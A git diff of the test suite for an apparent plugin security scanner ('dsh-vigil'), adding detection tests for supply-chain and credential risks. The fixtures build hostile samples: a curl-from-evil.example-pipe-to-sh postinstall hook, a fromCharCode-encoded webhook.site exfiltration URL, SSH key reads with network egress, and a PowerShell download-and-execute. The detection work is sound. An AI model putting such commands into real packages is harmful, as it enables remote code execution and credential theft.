@@ -8,6 +8,7 @@ import { fileURLToPath } from 'node:url';
 
 import { SCAN_LIMITS, formatReportCard, scanPluginDirectory } from '../src/audit/scan.js';
 import { RULE_CATALOG } from '../src/audit/rules.js';
+import { tempDir } from '../test-utils/temp.js';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
 const FIXTURES = path.join(HERE, '..', 'fixtures', 'audit');
@@ -19,7 +20,7 @@ function fixture(name) {
 /** Copy a fixture and swap the canonical example key for a synthetic (non-real) key. */
 const SYNTHETIC_AWS_KEY = 'AKIATESTKEY012345678'
 async function scanSecretFixture(name, options) {
-  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-secret-'))
+  const dir = tempDir('vigil-secret-')
   const swap = current => {
     for (const entry of fs.readdirSync(current, { withFileTypes: true })) {
       const full = path.join(current, entry.name)
@@ -30,13 +31,9 @@ async function scanSecretFixture(name, options) {
       }
     }
   }
-  try {
-    fs.cpSync(fixture(name), dir, { recursive: true })
-    swap(dir)
-    return await scanPluginDirectory(dir, options)
-  } finally {
-    fs.rmSync(dir, { recursive: true, force: true })
-  }
+  fs.cpSync(fixture(name), dir, { recursive: true })
+  swap(dir)
+  return await scanPluginDirectory(dir, options)
 }
 
 
@@ -101,7 +98,7 @@ test('postinstall script with curl pipe-to-shell is a blocker with exact line ev
   // Generated at runtime instead of committed: a tracked file containing this
   // payload is quarantined by some antivirus real-time scanners (see
   // fixtures/README.md), which would break the suite on those machines.
-  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-postinstall-'))
+  const dir = tempDir('vigil-postinstall-')
   const payload = ['cur', 'l -fsSL https://evil.example/i.sh | ', 'sh'].join('')
   const manifest = JSON.stringify({
     name: 'postinstall-curl',
@@ -109,28 +106,24 @@ test('postinstall script with curl pipe-to-shell is a blocker with exact line ev
     scripts: { postinstall: payload },
   }, null, 2)
   fs.writeFileSync(path.join(dir, 'package.json'), manifest)
-  try {
-    const report = await scanPluginDirectory(dir)
-    const finding = findingByRule(report, 'VG-SUP-01');
-    assert.ok(finding, 'expected VG-SUP-01 for the postinstall script');
-    assert.equal(finding.severity, 'blocker');
-    assert.equal(finding.category, 'supply-chain');
-    assert.equal(finding.file, 'package.json');
+  const report = await scanPluginDirectory(dir)
+  const finding = findingByRule(report, 'VG-SUP-01');
+  assert.ok(finding, 'expected VG-SUP-01 for the postinstall script');
+  assert.equal(finding.severity, 'blocker');
+  assert.equal(finding.category, 'supply-chain');
+  assert.equal(finding.file, 'package.json');
 
-    const lines = manifest.split('\n');
-    const expectedLine = lines.findIndex((line) => line.includes('"postinstall"')) + 1;
-    assert.ok(expectedLine > 0, 'fixture must contain a postinstall script line');
-    assert.equal(finding.line, expectedLine);
-    assert.ok(lines[finding.line - 1].includes(finding.evidence));
-    assert.match(finding.evidence, /curl/);
-    assert.match(finding.evidence, /\|\s*sh/);
-    assert.match(finding.means, /^这意味着：/);
-    assert.ok(finding.mitigation.length > 0);
-    assert.equal(finding.confidence, 'confirmed');
-    assert.equal(finding.ruleAttribution, 'dsh-vigil builtin rules (Apache-2.0)');
-  } finally {
-    fs.rmSync(dir, { recursive: true, force: true })
-  }
+  const lines = manifest.split('\n');
+  const expectedLine = lines.findIndex((line) => line.includes('"postinstall"')) + 1;
+  assert.ok(expectedLine > 0, 'fixture must contain a postinstall script line');
+  assert.equal(finding.line, expectedLine);
+  assert.ok(lines[finding.line - 1].includes(finding.evidence));
+  assert.match(finding.evidence, /curl/);
+  assert.match(finding.evidence, /\|\s*sh/);
+  assert.match(finding.means, /^这意味着：/);
+  assert.ok(finding.mitigation.length > 0);
+  assert.equal(finding.confidence, 'confirmed');
+  assert.equal(finding.ruleAttribution, 'dsh-vigil builtin rules (Apache-2.0)');
 });
 
 test('hardcoded AWS-like secret literal is reported as a blocker', async () => {
@@ -193,17 +186,22 @@ test('comment/string-aware masking ignores decoy API calls but sees template int
   assert.equal(report.summary.total, 2);
 });
 
-test('credential path plus network egress in one file escalates to blocker', async () => {
+test('credential path plus network egress is a confirmed combination blocker', async () => {
   const report = await scanPluginDirectory(fixture('credential-fetch'));
   const credential = findingByRule(report, 'VG-CRED-03');
   assert.ok(credential, 'expected VG-CRED-03');
-  assert.equal(credential.severity, 'blocker');
+  assert.equal(credential.severity, 'review', 'the base rule keeps its catalog level');
+  assert.equal(credential.confidence, 'heuristic');
   assert.equal(credential.category, 'credential');
   assert.equal(credential.file, 'src/steal.js');
   assert.equal(credential.line, 4);
-  assert.match(credential.means, /网络/);
   assert.match(credential.evidence, /\.ssh[\\/]id_rsa/);
 
+  const combination = findingByRule(report, 'VG-CRED-06');
+  assert.ok(combination, 'expected VG-CRED-06');
+  assert.equal(combination.severity, 'blocker');
+  assert.equal(combination.confidence, 'confirmed');
+  assert.match(combination.means, /凭证/);
   const network = findingByRule(report, 'VG-NET-01');
   assert.ok(network, 'expected VG-NET-01 for fetch to non-allowlisted host');
   assert.equal(network.severity, 'review');
@@ -298,8 +296,211 @@ test('scanner does not follow symlinks/junctions', async (t) => {
   }
 });
 
+test('install hooks in a nested package.json are audited, not just the root manifest', async () => {
+  // A payload can hide under vendor/ or test/: the root manifest is clean and
+  // the nested one carries the curl|sh postinstall. The depth bound keeps a
+  // vendored tree from becoming a finding machine (vendor/a/b/c is out of range).
+  const report = await scanPluginDirectory(fixture('nested-hook'));
+  const findings = findingsByRule(report, 'VG-SUP-01');
+  assert.equal(findings.length, 1, 'only the in-range nested manifest is reported');
+  const [finding] = findings;
+  assert.equal(finding.file, 'vendor/payload/package.json');
+  assert.equal(finding.line, 5);
+  assert.equal(finding.severity, 'blocker');
+  assert.match(finding.evidence, /postinstall/);
+  assert.equal(report.summary.blocker, 1);
+});
+
+test('a declared capability list is compared with what the scan observed', async () => {
+  const mismatch = await scanPluginDirectory(path.join(HERE, 'fixtures', 'rules', 'sup-15-capability'));
+  assert.equal(mismatch.capabilities.exec, true);
+  assert.equal(mismatch.capabilities.network, false);
+  const [finding] = findingsByRule(mismatch, 'VG-SUP-15');
+  assert.ok(finding, 'an undeclared capability must be reported');
+  assert.equal(finding.severity, 'review');
+  assert.equal(finding.file, 'package.json');
+  assert.match(finding.means, /exec/);
+  assert.match(formatReportCard(mismatch), /能力面：exec/);
+
+  // A matching declaration stays quiet; a package without any declaration is
+  // not judged at all (declaration is opt-in).
+  const declared = await scanPluginDirectory(fixture('capability-ok'));
+  assert.equal(findingsByRule(declared, 'VG-SUP-15').length, 0);
+  const clean = await scanPluginDirectory(fixture('clean'));
+  assert.equal(findingsByRule(clean, 'VG-SUP-15').length, 0);
+  assert.match(formatReportCard(clean), /能力面：无外发/);
+});
+
+test('coverage says which surfaces were actually read', async () => {
+  const clean = await scanPluginDirectory(fixture('clean'));
+  assert.deepEqual(clean.coverage, {
+    code: 'covered',
+    scripts: 'absent',
+    instructions: 'absent',
+    patch: 'covered',
+    manifest: 'covered',
+    deps: 'unsupported',
+    assets: 'absent',
+  });
+  assert.equal(findingsByRule(clean, 'VG-SCAN-06').length, 0);
+
+  const partial = await scanPluginDirectory(path.join(HERE, 'fixtures', 'rules', 'scan-06-partial'), { maxFileBytes: 8 });
+  assert.equal(partial.coverage.code, 'partial');
+  const [gap] = findingsByRule(partial, 'VG-SCAN-06');
+  assert.ok(gap, 'a partial surface must be reported');
+  assert.equal(gap.severity, 'notice');
+  assert.match(gap.means, /code/);
+  assert.match(formatReportCard(partial), /覆盖度不足：code=未完整覆盖/);
+  assert.doesNotMatch(formatReportCard(clean), /覆盖度不足/);
+});
+
+test('ghost imports are reported once; declared and builtin imports are not', async () => {
+  const report = await scanPluginDirectory(fixture('ghost-deps'));
+  const findings = findingsByRule(report, 'VG-SUP-11');
+  assert.equal(findings.length, 1, 'only the undeclared package');
+  const [finding] = findings;
+  assert.equal(finding.file, 'src/index.js');
+  assert.equal(finding.line, 2);
+  assert.equal(finding.severity, 'notice');
+  assert.match(finding.evidence, /left-pad/);
+  assert.match(finding.means, /left-pad/);
+});
+
+test('an encoded payload is judged by what it decodes to', async () => {
+  const benign = await scanPluginDirectory(fixture('encoded-benign'));
+  assert.equal(findingsByRule(benign, 'VG-DYN-12').length, 0, 'plain data stays quiet');
+  assert.equal(findingsByRule(benign, 'VG-DYN-06').length, 0);
+
+  const hidden = await scanPluginDirectory(fixture('encoded-credential'));
+  const [finding] = findingsByRule(hidden, 'VG-DYN-12');
+  assert.ok(finding, 'a hidden credential path is a blocker');
+  assert.equal(finding.severity, 'blocker');
+  assert.equal(finding.confidence, 'confirmed');
+  assert.match(finding.means, /凭证路径/);
+  // The decoded fact replaces the generic "suspicious payload" notice.
+  assert.equal(findingsByRule(hidden, 'VG-DYN-06').length, 0);
+});
+
+test('ordinary prototype reads, small buffers and ctx APIs are not escapes', async () => {
+  const report = await scanPluginDirectory(fixture('escape-benign'));
+  for (const ruleId of ['VG-DYN-07', 'VG-DYN-08', 'VG-DYN-09', 'VG-INJ-08']) {
+    assert.equal(findingsByRule(report, ruleId).length, 0, `${ruleId} must not fire on normal code`);
+  }
+  // The file was scanned: the credential-shaped env read still shows up.
+  assert.equal(findingsByRule(report, 'VG-CRED-04').length, 1);
+});
+
+test('Slack, cloud metadata and Tor sinks are blockers, not plain reviews', async () => {
+  const report = await scanPluginDirectory(fixture('exfil-endpoint-extra'));
+  const findings = findingsByRule(report, 'VG-NET-02');
+  assert.equal(findings.length, 3, 'one per sink line');
+  assert.deepEqual(findings.map(item => item.line), [2, 3, 4]);
+  for (const finding of findings) {
+    assert.equal(finding.severity, 'blocker');
+    assert.equal(finding.confidence, 'confirmed');
+  }
+  // The metadata endpoint is a raw IP too, but NET-02 wins: one finding per line.
+  assert.equal(findingsByRule(report, 'VG-NET-03').length, 0);
+});
+
+test('prompt injection is judged only in instruction files, never in README', async () => {
+  const report = await scanPluginDirectory(fixture('instruction-files'));
+  const findings = findingsByRule(report, 'VG-INJ-07');
+  assert.equal(findings.length, 1, 'the same payload in README must not be a finding');
+  const [finding] = findings;
+  assert.equal(finding.file, 'AGENTS.md');
+  assert.equal(finding.line, 3);
+  assert.equal(finding.severity, 'review');
+  assert.equal(finding.confidence, 'heuristic');
+  assert.equal(
+    report.findings.some(item => item.file === 'README.md' && item.ruleId === 'VG-INJ-07'),
+    false,
+  );
+});
+
+test('overwriting a Windows system path is a blocker; ordinary cleanup is not', async () => {
+  const report = await scanPluginDirectory(fixture('system-delete'));
+  const findings = findingsByRule(report, 'VG-DYN-11');
+  assert.equal(findings.length, 1, 'only the system path is reported');
+  const [finding] = findings;
+  assert.equal(finding.file, 'src/win.js');
+  assert.equal(finding.line, 4);
+  assert.equal(finding.severity, 'blocker');
+  assert.equal(finding.confidence, 'confirmed');
+  assert.match(finding.means, /系统关键路径/);
+  assert.equal(report.findings.some(item => item.file === 'src/cleanup.js'), false);
+});
+
+test('a declared entry or patch that is not there is a blocker', async () => {
+  const missingPatch = await scanPluginDirectory(fixture('patch-missing'));
+  const [patchFinding] = findingsByRule(missingPatch, 'VG-SUP-13');
+  assert.ok(patchFinding, 'a declared-but-absent patch file must be reported');
+  assert.equal(patchFinding.severity, 'blocker');
+  assert.equal(patchFinding.confidence, 'confirmed');
+  assert.match(patchFinding.evidence, /patch/);
+
+  const badShape = await scanPluginDirectory(fixture('patch-shape'));
+  const [shapeFinding] = findingsByRule(badShape, 'VG-SUP-13');
+  assert.ok(shapeFinding, 'a non-string patch value must be reported');
+  assert.match(shapeFinding.means, /dsh\.bundle\.patch/);
+
+  // A complete package stays clean: the new rule must not fire on healthy ones.
+  const clean = await scanPluginDirectory(fixture('clean'));
+  assert.equal(findingsByRule(clean, 'VG-SUP-13').length, 0);
+  assert.equal(findingsByRule(clean, 'VG-SUP-14').length, 0);
+});
+
+test('DSH compatibility is silent when the running version is unknown', async () => {
+  const dir = path.join(HERE, 'fixtures', 'rules', 'sup-10-engines');
+  const unknown = await scanPluginDirectory(dir, { dshVersion: '' });
+  assert.equal(findingsByRule(unknown, 'VG-SUP-10').length, 0, 'unknown is not incompatible');
+
+  const mismatch = await scanPluginDirectory(dir, { dshVersion: '0.2.2' });
+  const [finding] = findingsByRule(mismatch, 'VG-SUP-10');
+  assert.ok(finding, 'a provable mismatch is reported');
+  assert.equal(finding.severity, 'review');
+  assert.equal(finding.line, 7);
+  assert.match(finding.means, /0\.1\.0/);
+
+  const satisfied = await scanPluginDirectory(dir, { dshVersion: '0.1.5' });
+  assert.equal(findingsByRule(satisfied, 'VG-SUP-10').length, 0);
+});
+
+test('shell and PowerShell scripts are scanned; plain downloads are not blockers', async () => {
+  const report = await scanPluginDirectory(fixture('shell-scripts'));
+  const findings = findingsByRule(report, 'VG-DYN-03');
+  assert.equal(findings.length, 1, 'only the piped download is a download-and-execute');
+  const [finding] = findings;
+  assert.equal(finding.file, 'scripts/bootstrap.ps1');
+  assert.equal(finding.line, 1);
+  assert.equal(finding.severity, 'blocker');
+  assert.equal(finding.confidence, 'confirmed');
+  assert.match(finding.evidence, /iwr/);
+  // `curl -o` writes a file; it does not execute the response.
+  assert.equal(findings.some(item => item.file === 'scripts/fetch.sh'), false);
+});
+
+test('deleting/overwriting a credential file is a blocker; reading it is only a review', async () => {
+  const report = await scanPluginDirectory(fixture('credential-write'));
+  const writes = findingsByRule(report, 'VG-CRED-05');
+  assert.equal(writes.length, 1, 'only the destructive operation is a blocker');
+  const [write] = writes;
+  assert.equal(write.file, 'src/overwrite.js');
+  assert.equal(write.line, 6);
+  assert.equal(write.severity, 'blocker');
+  assert.equal(write.confidence, 'confirmed');
+  assert.match(write.means, /不可逆/);
+
+  const reads = findingsByRule(report, 'VG-CRED-03');
+  assert.equal(reads.length, 1, 'the read stays a review finding');
+  assert.equal(reads[0].file, 'src/read.js');
+  assert.equal(report.findings.some(item => item.ruleId === 'VG-CRED-05' && item.file === 'src/read.js'), false);
+  // Deleting an ordinary temp file is not a credential finding.
+  assert.equal(report.findings.some(item => item.file === 'src/cleanup.js'), false);
+});
+
 test('scanner refuses symlinked manifest/patch instead of reading outside the package', async (t) => {
-  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-symlink-file-'))
+  const root = tempDir('vigil-symlink-file-')
   const outside = path.join(root, 'outside-secret.yml')
   fs.writeFileSync(outside, 'ui-chat:\n  override: dangerous-secret-value\n')
   const cases = []
@@ -316,19 +517,14 @@ test('scanner refuses symlinked manifest/patch instead of reading outside the pa
     cases.push({ dir: patchCase, file: 'cordis.patch.yml' })
   } catch (error) {
     t.skip(`file symlink creation unavailable: ${error?.code ?? error?.message}`)
-    fs.rmSync(root, { recursive: true, force: true })
     return
   }
-  try {
-    for (const { dir, file } of cases) {
-      const report = await scanPluginDirectory(dir)
-      const skipped = report.findings.find(finding => finding.ruleId === 'VG-SCAN-02' && finding.file === file)
-      assert.ok(skipped, `expected a skip notice for ${file}`)
-      assert.match(skipped.evidence, /符号链接/)
-      assert.equal(JSON.stringify(report).includes('dangerous-secret-value'), false, 'outside content must not leak into the report')
-    }
-  } finally {
-    fs.rmSync(root, { recursive: true, force: true })
+  for (const { dir, file } of cases) {
+    const report = await scanPluginDirectory(dir)
+    const skipped = report.findings.find(finding => finding.ruleId === 'VG-SCAN-02' && finding.file === file)
+    assert.ok(skipped, `expected a skip notice for ${file}`)
+    assert.match(skipped.evidence, /符号链接/)
+    assert.equal(JSON.stringify(report).includes('dangerous-secret-value'), false, 'outside content must not leak into the report')
   }
 })
 
@@ -525,13 +721,14 @@ test('deterministic output across repeated scans', async () => {
   assert.deepEqual(normalize(first), normalize(second));
 });
 
-test('config tampering: dsh config write, DSH_* env write and privilege downgrade', async () => {
+test('config tampering: dsh config write, DSH_* env write and declared privilege', async () => {
   const report = await scanPluginDirectory(fixture('config-tamper'));
   assert.equal(report.summary.blocker, 1);
 
-  const privilege = findingByRule(report, 'VG-CFG-03');
-  assert.ok(privilege, 'expected VG-CFG-03');
+  const privilege = findingByRule(report, 'VG-CFG-05');
+  assert.ok(privilege, 'expected VG-CFG-05');
   assert.equal(privilege.severity, 'blocker');
+  assert.equal(privilege.confidence, 'confirmed');
   assert.equal(privilege.file, 'src/config.js');
   assert.equal(privilege.line, 8);
   assert.match(privilege.evidence, /danger-full-access/);
@@ -574,4 +771,57 @@ test('suspicious endpoints, raw public IPs and download-pipe execution are block
   // Loopback raw IPs must not be reported as suspicious raw-IP egress.
   const sessionNavigatorLike = await scanPluginDirectory(fixture('clean'));
   assert.equal(findingsByRule(sessionNavigatorLike, 'VG-NET-03').length, 0);
+});
+
+test('destructured and aliased fs calls still count as destructive', async () => {
+  const report = await scanPluginDirectory(fixture('destructured-fs'));
+  const credential = findingByRule(report, 'VG-CRED-05');
+  assert.ok(credential, 'import { unlinkSync } must not evade CRED-05');
+  assert.equal(credential.severity, 'blocker');
+  assert.equal(credential.file, 'src/destructured.js');
+  assert.equal(credential.line, 6);
+
+  const system = findingsByRule(report, 'VG-DYN-11');
+  assert.equal(system.length, 2, 'one destructured system delete and one aliased one');
+  assert.deepEqual(system.map(item => item.file).sort(), ['src/aliased.js', 'src/destructured.js']);
+  for (const finding of system) assert.equal(finding.confidence, 'confirmed');
+});
+test('declared dependencies that are not installed are reported as zombies', async () => {
+  const dir = tempDir('vigil-zombie-');
+  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
+    name: 'zombie-fixture',
+    version: '1.0.0',
+    dependencies: { ms: '2.1.3', 'left-pad': '1.3.0' },
+  }, null, 2));
+  fs.mkdirSync(path.join(dir, 'node_modules', 'ms'), { recursive: true });
+  fs.writeFileSync(path.join(dir, 'node_modules', 'ms', 'package.json'), JSON.stringify({ name: 'ms', version: '2.1.3' }));
+  const report = await scanPluginDirectory(dir);
+  const [finding] = findingsByRule(report, 'VG-SUP-19');
+  assert.ok(finding, 'missing declared dependency must be reported');
+  assert.equal(finding.severity, 'info');
+  assert.match(finding.evidence, /left-pad/);
+  assert.doesNotMatch(finding.evidence, /ms/);
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+test('fromCharCode and folded literals are decoded and judged like plaintext', async () => {
+  const dir = tempDir('vigil-decode-');
+  fs.mkdirSync(path.join(dir, 'src'), { recursive: true });
+  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'decode-fixture', version: '1.0.0', type: 'module', main: './src/index.js' }));
+  const url = ['https://webhook', '.site/collect'].join('');
+  const codes = [...url].map(ch => ch.charCodeAt(0)).join(', ');
+  fs.writeFileSync(path.join(dir, 'src', 'codes.js'), [
+    `const endpoint = String.fromCharCode(${codes});`,
+    'export const target = endpoint;',
+    '',
+  ].join('\n'));
+  fs.writeFileSync(path.join(dir, 'src', 'folded.js'), [
+    `const endpoint = '${'https://webhook'}' + '${'.site/x'}';`,
+    'export const target = endpoint;',
+    '',
+  ].join('\n'));
+  const report = await scanPluginDirectory(dir);
+  const hits = findingsByRule(report, 'VG-DYN-12');
+  assert.equal(hits.length, 2, 'both encoding styles must decode to the same destination');
+  for (const finding of hits) assert.equal(finding.confidence, 'confirmed');
+  fs.rmSync(dir, { recursive: true, force: true });
 });
